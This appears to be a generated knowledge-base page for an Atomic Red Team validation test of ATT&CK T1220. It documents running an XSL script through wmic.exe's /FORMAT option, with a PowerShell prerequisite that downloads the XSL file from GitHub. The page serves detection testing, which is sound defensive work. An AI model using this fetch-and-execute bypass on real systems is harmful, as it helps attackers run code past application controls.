---
atomic_guid: "1b237334-3e21-4a0c-8178-b8c996124988"
title: "WMIC bypass using local XSL file"
framework: "atomic"
generated: "true"
attack_technique_id: "T1220"
attack_technique_name: "XSL Script Processing"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.yaml"
build_date: "2026-04-27 19:12:27"
executor: "command_prompt"
aliases:
  - "1b237334-3e21-4a0c-8178-b8c996124988"
  - "WMIC bypass using local XSL file"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Executes the code specified within a XSL script using a local payload.

## ATT&CK Mapping

- [[kb/attack/techniques/T1220-xsl_script_processing|T1220: XSL Script Processing]]

## Input Arguments

### local_xsl_file

- description: Location of the test XSL script file on the local filesystem.
- type: path
- default: PathToAtomicsFolder\T1220\src\wmicscript.xsl

### wmic_command

- description: WMI command to execute using wmic.exe
- type: string
- default: process list

## Dependencies

XSL file must exist on disk at specified location (#{local_xsl_file})

### Prerequisite Check

```powershell
if (Test-Path "#{local_xsl_file}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{local_xsl_file}") -ErrorAction Ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
```

## Executor

- name: command_prompt

### Command

```cmd
wmic #{wmic_command} /FORMAT:"#{local_xsl_file}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.yaml)
